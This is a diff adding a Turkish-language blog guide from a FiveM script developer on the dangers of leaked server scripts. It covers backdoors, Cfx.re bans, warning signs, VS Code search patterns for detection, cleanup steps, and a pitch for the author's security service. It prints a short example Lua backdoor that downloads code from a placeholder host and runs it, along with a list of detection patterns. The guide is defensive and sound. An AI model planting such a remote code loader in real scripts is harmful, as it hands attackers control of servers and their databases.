+.form-foot .pill{border:0;cursor:pointer;font-family:inherit}
+.form-foot .pill[disabled]{opacity:.6;cursor:wait}
+.form-status{font-size:14px;color:var(--ink-2)}
+.form-status.ok{color:var(--signal)}
+.form-status.err{color:var(--rec)}
+.contact-side{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:clamp(1.3rem,3vw,2rem)}
+.contact-side .eyebrow{text-align:left}
+.contact-list{display:flex;flex-direction:column;gap:.55rem}
+.contact-list .pill{justify-content:space-between;width:100%}
+footer{background:var(--bg);border-top:1px solid var(--line)}
+footer div{width:var(--wrap);margin:0 auto;padding:1.2rem 0;font-family:var(--mono);font-size:12px;color:var(--ink-3);text-align:center;letter-spacing:.04em}
+
+/* ---------- reveal ---------- */
+.rv{opacity:0;transform:translateY(28px);transition:opacity 1s cubic-bezier(.2,.7,.2,1),transform 1s cubic-bezier(.2,.7,.2,1)}
+.rv.in{opacity:1;transform:none}
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation:none!important;transition:none!important}
+  .rv,.hero > div{opacity:1;transform:none}
+}
+
+/* ---------- service page ---------- */
+.nav-inner{grid-template-columns:auto 1fr auto}
+.links{justify-content:center}
+.nav-cta{justify-self:end;font-size:12px;font-weight:600;background:var(--signal);color:#000;padding:.4rem .9rem;border-radius:980px}
+@media (max-width:767px){.nav-inner{grid-template-columns:1fr auto}}
+.svc-hero{min-height:auto;padding:clamp(5rem,10vw,8rem) 1.25rem clamp(4rem,8vw,6rem)}
+.svc-hero h1{font-size:clamp(2.5rem,1rem + 5.4vw,5.2rem);line-height:1.02;max-width:16ch;margin:0 auto}
+.svc-hero h1 em{font-size:1.05em}
+.crumbs{font-family:var(--mono);font-size:12px;color:var(--ink-3);margin-bottom:1.6rem;letter-spacing:.02em}
+.crumbs a{color:var(--ink-2)} .crumbs a:hover{color:var(--signal)} .crumbs span{margin:0 .4rem}
+.trust{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:.5rem 1.4rem;margin-top:2.2rem;font-family:var(--mono);font-size:12px;color:var(--ink-2);letter-spacing:.02em}
+.trust li::before{content:"✓";color:var(--signal);margin-right:.45rem}
+.svc-grid{width:var(--wide);margin:0 auto;display:grid;grid-template-columns:1fr;gap:1.1rem}
+@media (min-width:740px){.svc-grid{grid-template-columns:1fr 1fr}}
+@media (min-width:1068px){.svc-grid{grid-template-columns:repeat(3,1fr)}}
+.svc-cta{display:flex;flex-direction:column;justify-content:center;border-style:dashed}
+.svc-cta .go{font-family:var(--mono);font-size:13px;color:var(--signal);margin-top:1rem}
+.svc li:last-child{color:var(--ink)}
+.why{width:var(--wide);margin:0 auto;display:grid;grid-template-columns:1fr;gap:1.1rem}
+@media (min-width:740px){.why{grid-template-columns:1fr 1fr}}
+@media (min-width:1068px){.why{grid-template-columns:repeat(4,1fr)}}
+.why-item{border-top:2px solid var(--signal);padding-top:1.1rem}
+.why-item b{display:block;font-size:20px;font-weight:600;letter-spacing:-.01em;margin-bottom:.45rem}
+.why-item span{font-size:15px;color:var(--ink-2);line-height:1.55}
+.work-grid{width:var(--wide);margin:0 auto;display:grid;grid-template-columns:1fr;gap:1.1rem}
+@media (min-width:740px){.work-grid{grid-template-columns:1fr 1fr}}
+@media (min-width:1068px){.work-grid{grid-template-columns:repeat(3,1fr)}}
+.work{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;display:flex;flex-direction:column;transition:border-color .35s,transform .35s cubic-bezier(.2,.7,.2,1)}
+.work:hover{border-color:rgba(198,255,61,.35);transform:translateY(-3px)}
+.work img{width:100%;aspect-ratio:16/9;object-fit:cover;border-bottom:1px solid var(--line)}
+.work span{padding:1rem 1.2rem 1.2rem;font-size:14px;color:var(--ink-2);line-height:1.45}
+.work b{display:block;font-size:18px;color:var(--ink);font-weight:600;margin-bottom:.2rem}
+.work-more{justify-content:center;border-style:dashed;min-height:12rem}
+.work-more b{color:var(--signal)}
+#surec .process{margin-top:0}
+.faq{width:var(--wrap);margin:0 auto;display:flex;flex-direction:column;gap:.7rem;max-width:52rem}
+.qa{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:0 1.4rem;transition:border-color .3s}
+.qa[open]{border-color:rgba(198,255,61,.35)}
+.qa summary{list-style:none;cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:1rem;padding:1.15rem 0}
+.qa summary::-webkit-details-marker{display:none}
+.qa summary::after{content:"+";font-family:var(--mono);font-size:20px;color:var(--signal);transition:transform .3s}
+.qa[open] summary::after{transform:rotate(45deg)}
+.qa h3{font-size:17px;font-weight:600;letter-spacing:-.01em}
+.qa p{font-size:15px;line-height:1.6;color:var(--ink-2);padding-bottom:1.2rem}
+footer a{color:var(--ink-2)} footer a:hover{color:var(--signal)}
+
+.post-hero h1{font-size:clamp(2.3rem,1rem + 4.2vw,4.4rem);max-width:18ch}
+.meta{font-family:var(--mono);font-size:12px;color:var(--ink-3);letter-spacing:.03em;margin-top:1.2rem}
+.post{width:min(720px,100% - 2.5rem);margin:0 auto;padding:clamp(3rem,7vw,5rem) 0 clamp(4rem,8vw,6rem);text-align:left}
+.post h2{font-size:clamp(25px,2.6vw,32px);font-weight:600;letter-spacing:-.025em;line-height:1.15;margin:3.2rem 0 1rem;color:var(--ink)}
+.post h2 em{font-size:1.06em}
+.post h3{font-size:20px;font-weight:600;margin:2rem 0 .6rem}
+.post p,.post li{color:var(--ink-2);font-size:18px;line-height:1.7}
+.post p{margin:0 0 1.15rem}
+.post strong{color:var(--ink);font-weight:600}
+.post ul,.post ol{margin:0 0 1.4rem 1.3rem}
+.post li{margin:.4rem 0;padding-left:.2rem}
+.post li::marker{color:var(--signal)}
+.post a{color:var(--signal);text-decoration:underline;text-underline-offset:3px;text-decoration-thickness:1px}
+.post pre{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.25rem;overflow-x:auto;font-family:var(--mono);font-size:13.5px;line-height:1.65;margin:0 0 1.4rem;color:var(--ink)}
+.post code{font-family:var(--mono);font-size:.86em;background:rgba(255,255,255,.07);padding:.12em .38em;border-radius:6px;color:var(--ink)}
+.post pre code{background:none;padding:0;font-size:inherit}
+.post pre .c{color:var(--ink-3)} .post pre .k{color:#ff7ab6} .post pre .s{color:var(--signal)}
+.callout{border-left:3px solid var(--rec);background:rgba(255,77,46,.07);padding:1rem 1.25rem;border-radius:0 14px 14px 0;margin:0 0 1.5rem}
+.callout p:last-child{margin:0}
+.callout.ok{border-color:var(--signal);background:rgba(198,255,61,.06)}
+.toc{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:1.3rem 1.5rem;margin:0 0 2rem}
+.toc b{font-family:var(--mono);font-size:12px;letter-spacing:.06em;color:var(--ink-3);font-weight:600}
+.toc ol{margin:.7rem 0 0 1.2rem}.toc li{font-size:16px;margin:.3rem 0}
+.toc a{color:var(--ink-2);text-decoration:none}.toc a:hover{color:var(--signal)}
+.post-cta{margin:3.5rem 0 0;background:var(--card);border:1px solid rgba(198,255,61,.25);border-radius:22px;padding:2rem 1.6rem;text-align:center}
+.post-cta h2{margin:0 0 .7rem}
+.post-cta p{max-width:32rem;margin:0 auto 1.4rem}
+.post-cta .pill{text-decoration:none}
+.post .faq{width:100%;margin:0 0 1rem}
+.post .qa p{font-size:16px}
+.post .qa h3{margin:0;font-size:17px;line-height:1.35}
+.sources{border-top:1px solid var(--line);margin-top:3rem;padding-top:1.4rem}
+.sources p,.sources li{font-size:14px}
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="/" class="logo" aria-label="Yusuf Kaan Çelik — ana sayfa">YKÇ<span>.</span></a>
+    <nav class="links" aria-label="Sayfa menüsü">
+      <a href="/fivem-script-yaptirma/">Hizmetler</a>
+      <a href="/fivem-script-yaptirma/#isler">Örnek işler</a>
+      <a href="/">Portfolyo</a>
+    </nav>
+    <div class="nav-r"><a class="nav-cta" href="/fivem-script-yaptirma/#teklif">Teklif al</a></div>
+  </div>
+</header>
+
+<main>
+  <section class="hero svc-hero post-hero">
+    <i class="hero-bg" aria-hidden="true"><span class="code-rain" id="code-rain"></span></i>
+    <div>
+      <nav class="crumbs" aria-label="Sayfa yolu"><a href="/">Ana sayfa</a> <span>›</span> <a href="/fivem-script-yaptirma/">FiveM script yaptırma</a> <span>›</span> Rehber</nav>
+      <p class="eyebrow"><span class="dot"></span>Rehber · FiveM güvenliği</p>
+      <h1>FiveM leak script <em>neden tehlikeli?</em></h1>
+      <p class="sub">Backdoor'lar nasıl çalışır, sunucunda olup olmadığını nasıl anlarsın, bulaştıysa ne yapmalısın.</p>
+      <p class="meta">Yusuf Kaan Çelik · 19 Kasım 2026 · 7 dk okuma</p>
+    </div>
+  </section>
+
+  <article class="post">
+    <p>FiveM sunucusu açan hemen herkes bir noktada aynı teklifle karşılaşır: binlerce liralık bir script, bir Discord sunucusunda ya da "ücretsiz script" sitesinde bedava. Bunlara <strong>leak script</strong> denir: ücretli bir çalışmanın, sahibinin izni olmadan paylaşılan kopyası.</p>
+    <p>Kulağa kazançlı geliyor ama işin bedeli genelde sonradan ödeniyor. Kendi sunucum için 30'dan fazla script yazarken öğrendiklerimi ve FiveM topluluğunda sık yaşanan vakaları bu yazıda topladım.</p>
+
+    <nav class="toc" aria-label="İçindekiler"><b>İÇİNDEKİLER</b><ol>
+      <li><a href="#backdoor">Asıl tehlike: backdoor</a></li>
+      <li><a href="#yasak">Cfx.re yasağı</a></li>
+      <li><a href="#diger">Diğer sorunlar</a></li>
+      <li><a href="#belirtiler">Sunucunda backdoor olduğunun belirtileri</a></li>
+      <li><a href="#kontrol">Kendin nasıl kontrol edersin?</a></li>
+      <li><a href="#temizlik">Bulaştıysa ne yapmalısın?</a></li>
+      <li><a href="#korunma">Nasıl korunursun?</a></li>
+    </ol></nav>
+
+    <h2 id="backdoor">1. Asıl tehlike: <em>backdoor</em></h2>
+    <p>Bir scripti ücretsiz dağıtan kişinin bunu çoğu zaman iyilik olsun diye yapmadığını hesaba katmak gerekir. Leak paketlerin önemli bir kısmına <strong>backdoor</strong> (arka kapı) eklenir: dışarıdan birinin senin sunucunda kod çalıştırmasını sağlayan gizli birkaç satır.</p>
+    <p>Mantık genelde şöyle: sunucu açıldığında script, uzak bir adrese bağlanıp oradan kod indiriyor ve o kodu çalıştırıyor. Basitleştirilmiş hâli aşağıdaki gibi (adres temsilidir):</p>
+<pre><code><span class="c">-- Masum bir scriptin server.lua dosyasının en altına gizlenmiş</span>
+PerformHttpRequest(<span class="s">'https://ornek-panel.xyz/i?k=A1B2'</span>, <span class="k">function</span>(_, govde)
+    <span class="k">if</span> govde <span class="k">then</span> load(govde)() <span class="k">end</span>
+<span class="k">end</span>)</code></pre>
+    <p>Bu birkaç satır, saldırgana sunucunda <strong>istediği kodu çalıştırma</strong> imkânı verir. Sonrası saldırganın keyfine kalmış:</p>
+    <ul>
+      <li>Kendine ya da başkalarına para, eşya, araç vermek; sunucunun ekonomisini bozmak</li>
+      <li>Kendini admin yapmak, txAdmin'e erişmek, oyuncuları banlamak</li>
+      <li>Veritabanını çalmak ya da silmek</li>
+      <li>Sunucunu başka sunuculara saldırıda kullanmak, makineye kalıcı olarak yerleşmek</li>
+    </ul>
+    <p>Gerçek örneklerde bu satırlar çok daha iyi gizlenir: anlamsız karakter dizileriyle şifrelenir (<code>\x68\x74\x74\x70</code> gibi), alakasız bir dosyanın içine ya da tek satırlık bir <code>.js</code> dosyasına konur. <strong>Cipher Panel</strong> ve <strong>Blum Panel</strong> gibi isimlerle satılan araçlar tam olarak bu yöntemle çalışıyor ve Cfx.re forumunda kurbanların uyarı başlıkları hâlâ açılmaya devam ediyor.</p>
+    <div class="callout"><p><strong>Önemli:</strong> Backdoor'u kuran kişi sadece leak'i paylaşan olmayabilir. Leak paketler elden ele dolaşırken her paylaşan kendi kodunu ekleyebilir; yani "güvendiğim biri verdi" demek pek bir şey ifade etmez.</p></div>
+
+    <h2 id="yasak">2. Cfx.re <em>yasağı</em></h2>
+    <p>Leak script kullanmak FiveM'in kullanım şartlarına aykırı ve artık ciddi şekilde denetleniyor. Cfx.re Ağustos 2025'te yetkisiz leak asset kullandığı tespit edilen sunuculara <strong>iki hafta askıya alma</strong>, tekrarında <strong>kalıcı kapatma</strong> cezası getirdi. Ekim 2025'teki güncellemede de yüzlerce hesap ve sunucunun askıya alındığını duyurdu.</p>
+    <p>Yani aylarca emek verdiğin bir sunucu, bedava bir script yüzünden sunucu listesinden silinebilir.</p>
+
+    <h2 id="diger">3. Diğer <em>sorunlar</em></h2>
+    <ul>
+      <li><strong>Güncelleme yok:</strong> Leak'ler genelde eski sürümlerdir. QBCore ya da FiveM güncellendiğinde bozulurlar ve düzeltecek kimse yoktur.</li>
+      <li><strong>Destek yok:</strong> Hata çıktığında yazarına soramazsın; kodu çoğu zaman da okuyamazsın.</li>
+      <li><strong>Performans:</strong> Eklenen kodlar ve eski sürümler resmon'da gereksiz ms yükü yaratabilir.</li>
+      <li><strong>Emeğe saygı:</strong> O scripti yazan biri haftalarca uğraştı. Leak, küçük geliştiricilerin bu işi bırakmasının en büyük sebeplerinden biri.</li>
+    </ul>
+
+    <h2 id="belirtiler">4. Sunucunda backdoor olduğunun <em>belirtileri</em></h2>
+    <p>Aşağıdakilerden biri bile varsa ciddiye almalısın:</p>
+    <ul>
+      <li>Senin açmadığın admin hesapları ya da txAdmin kullanıcıları</li>
+      <li>Oyunculara açıklanamayan para, eşya veya araç gelmesi; ekonominin bir anda bozulması</li>
+      <li>Sunucu konsolunda tanımadığın adreslere giden HTTP istekleri</li>
+      <li>Sunucu makinesinde senin oluşturmadığın kullanıcılar, işlemler veya dosyalar</li>
+      <li>Sildiğin şüpheli kodun bir süre sonra <strong>geri gelmesi</strong></li>
+      <li>Sebepsiz yere artan ağ trafiği ya da resmon değerleri</li>
+    </ul>
+
+    <h2 id="kontrol">5. Kendin nasıl <em>kontrol edersin?</em></h2>
+    <p>Bunun için bir kod editörü yeterli. <strong>VS Code</strong> ile sunucunun <code>resources</code> klasörünü aç ve tüm dosyalarda arama yap (<code>Ctrl + Shift + F</code>). Şu ifadeleri tek tek ara:</p>
+    <ul>
+      <li><code>PerformHttpRequest</code>: dışarıya istek atan her yeri gösterir</li>
+      <li><code>load(</code>, <code>loadstring</code>, <code>assert(load</code>: metni kod olarak çalıştıran yerler</li>
+      <li>JavaScript dosyalarında <code>eval(</code>, <code>new Function</code>, <code>fromCharCode</code></li>
+      <li><code>\x68\x74\x74\x70</code>: şifrelenmiş "http" kelimesi</li>
+    </ul>
+    <div class="callout ok"><p><strong>Her sonuç zararlı değildir.</strong> Discord'a log gönderen ya da sürüm kontrolü yapan meşru scriptler de <code>PerformHttpRequest</code> kullanır. Asıl alarm işareti, <strong>dışarıdan gelen cevabın kod olarak çalıştırılması</strong> ve okunamayacak kadar şifrelenmiş satırlardır. Emin olamıyorsan o dosyayı bir bilene göster.</p></div>
+    <p>Bir de her scriptin <code>fxmanifest.lua</code> dosyasına bak: scriptin işiyle alakası olmayan ek <code>server_script</code> satırları ya da adı tuhaf dosyalar bir ipucudur.</p>
+
+    <h2 id="temizlik">6. Bulaştıysa <em>ne yapmalısın?</em></h2>
+    <ol>
+      <li><strong>Sunucuyu kapat.</strong> Saldırgan erişimi açıkken temizlik yapmak boşuna olur.</li>
+      <li><strong>Şüpheli kaynakları kaldır</strong> ve diğer tüm scriptleri de aynı yöntemle tara; backdoor'lar kendini başka dosyalara kopyalayabilir.</li>
+      <li><strong>Bütün şifreleri temiz bir cihazdan değiştir:</strong> txAdmin, veritabanı, RCON, sunucu makinesi, Discord bot token'ları, hosting paneli.</li>
+      <li><strong>Veritabanını kontrol et:</strong> yeni admin kayıtları, şişirilmiş bakiyeler. Gerekirse temiz bir yedeğe dön.</li>
+      <li><strong>Ciddi bulaşmada makineyi sıfırdan kur.</strong> Backdoor dosya sistemine yazabildiyse, işletim sisteminde iz bırakmış olabilir; en güvenli yol temiz kurulum.</li>
+    </ol>
+
+    <h2 id="korunma">7. Nasıl <em>korunursun?</em></h2>
+    <ul>
+      <li>Scripti <strong>yazarından</strong> ya da Cfx.re'nin onaylı Tebex satıcılarından al.</li>
+      <li>Ücretsiz script istiyorsan GitHub'daki <strong>açık kaynak</strong> ve bilinen projeleri tercih et; kodunu okuyabildiğin şeyi kur.</li>
+      <li>Yeni bir scripti kurmadan önce yukarıdaki aramayı o klasörde yap.</li>
+      <li>Sunucuyu <strong>Administrator / root</strong> yetkisiyle çalıştırma; ayrı, kısıtlı bir kullanıcı kullan.</li>
+      <li>Veritabanının düzenli <strong>yedeğini</strong> al.</li>
+    </ul>
+
+    <div class="post-cta">
+      <h2>Sunucundan <em>şüpheleniyor musun?</em></h2>
+      <p>Resources klasörünü tarayıp backdoor ve zararlı kodu temizleyebilirim. Ya da leak'e hiç ihtiyaç duymaman için sunucuna özel, kilitsiz bir script yazabilirim.</p>
+      <a class="pill fill" href="/fivem-script-yaptirma/#guvenlik">Güvenlik hizmetine bak</a>
+    </div>
+
+    <h2 id="sss">Sık sorulan <em>sorular</em></h2>
+    <div class="faq">
+      <details class="qa"><summary><h3>Leak script kullanmak yasak mı?</h3></summary><p>Evet. Leak scriptler başkasının ücretli çalışmasının izinsiz kopyalarıdır ve FiveM kullanım şartlarına aykırıdır. Cfx.re, 2025'ten beri leak asset kullandığı tespit edilen sunuculara önce askıya alma, tekrarında kalıcı kapatma uyguluyor.</p></details>
+      <details class="qa"><summary><h3>Antivirüs FiveM backdoor'unu yakalar mı?</h3></summary><p>Çoğu zaman hayır. Backdoor, scriptin içine eklenmiş birkaç satır Lua ya da JavaScript kodudur; bilgisayar için sıradan bir metin dosyası gibi görünür. Bu yüzden kaynak kodunu okuyarak ya da şüpheli kalıpları arayarak bulmak gerekir.</p></details>
+      <details class="qa"><summary><h3>Leak scripti silmek yeterli mi?</h3></summary><p>Her zaman değil. Bazı backdoor'lar başka scriptlere ya da sunucu dosyalarına kendini kopyalar, yeni admin hesapları açar. Scripti sildikten sonra diğer kaynakları da taramak, tüm şifreleri değiştirmek ve ciddi bulaşmada sunucuyu sıfırdan kurmak gerekir.</p></details>
+    </div>
+
+    <div class="sources">
+      <p><strong>Kaynaklar</strong></p>
+      <ul>
+        <li><a href="https://forum.cfx.re/t/asset-security-update/5344773" target="_blank" rel="noopener">Cfx.re: Asset Security Update</a></li>
+        <li><a href="https://forum.cfx.re/t/warning-blum-panel-blum-panel-me-warden-panel-me-is-a-malicious-backdoor-remote-code-loader-hidden-in-resources/5415839" target="_blank" rel="noopener">Cfx.re forumu: Blum Panel uyarısı</a></li>
+        <li><a href="https://github.com/ericstolly/cipher" target="_blank" rel="noopener">Cipher Panel'in tersine mühendislik analizi (GitHub)</a></li>
+      </ul>
+    </div>
+  </article>
+</main>
+
+<footer><div>© <span id="year"></span> Yusuf Kaan Çelik · <a href="/">Portfolyo</a> · <a href="/fivem-script-yaptirma/">FiveM script yaptırma</a></div></footer>
+
+<script>
+const $ = (s, r=document) => r.querySelector(s);
+const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+const CODE = [
+  "RegisterNetEvent('ykc-police:client:cuff', function(target)",
+  "local radar = exports['ykc-hud']:GetRadar()",
+  "QBCore.Functions.Notify('Akbil yüklendi', 'success')",
+  "exports['qb-target']:AddBoxZone('metro_turnstile', coords, 1.2, 1.2)",
+  "TriggerServerEvent('ykc-fuel:server:pay', liters, 'bank')",
+  "local Player = QBCore.Functions.GetPlayer(source)",
+  "SendNUIMessage({ action = 'open', app = 'ls-rota' })",
+  "SetVehicleFuelLevel(vehicle, fuel + 0.25)",
+  "-- ykc-metro: NPC hattı Pillbox South → LSIA",
+  "CreateThread(function() while true do Wait(250) end end)",
+  "RegisterNUICallback('mdt:saveReport', function(data, cb)",
+  "MySQL.insert.await('INSERT INTO ykc_reports (title) VALUES (?)', { title })",
+  "if speed > limit then exports['ykc-police']:Flag(plate) end",
+  "lib.callback.register('ykc-phone:getApps', function() return apps end)",
+  "AddEventHandler('ykc-bus:client:board', function(line)",
+  "-- ykc-hud: araç, motor, tekne, uçak göstergeleri",
+  "local key = { plate = plate, owner = citizenid }",
+  "TaskStartScenarioInPlace(ped, 'PROP_HUMAN_SEAT_CHAIR', 0, true)",
+];
+function hl(line){
+  let h = esc(line);
+  if (line.trim().startsWith("--")) return `<span class="c">${h}</span>`;
+  h = h.replace(/(&#39;[^&]*?&#39;)/g, '<span class="s">$1</span>');
+  h = h.replace(/\b(local|function|end|if|then|return|while|true|do)\b/g, '<span class="k">$1</span>');
+  return h;
+}
+function renderCode(){
+  const el = $("#code-rain"); if (!el) return;
+  const rows = 64, gap = "\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0";
+  let html = "";
+  for (let r = 0; r < rows; r++){
+    const seq = [];
+    for (let i = 0; i < 12; i++) seq.push(hl(CODE[(r * 5 + i * 3) % CODE.length]));
+    const line = seq.join(gap) + gap;
+    html += `<span class="row" style="--d:${70 + (r * 37) % 50}s">${line}${line}</span>`;
+  }
+  el.innerHTML = html;
+}
+renderCode();
+$("#year").textContent = new Date().getFullYear();
+try{ localStorage.setItem("lang", document.documentElement.lang); }catch(e){}
+const io = "IntersectionObserver" in window ? new IntersectionObserver(es => es.forEach(e => {
+  if (e.isIntersecting){ e.target.classList.add("in"); io.unobserve(e.target); }
+}), {threshold:.12}) : null;
+document.querySelectorAll(".rv").forEach(el => io ? io.observe(el) : el.classList.add("in"));
+</script>
+</body>
+</html>
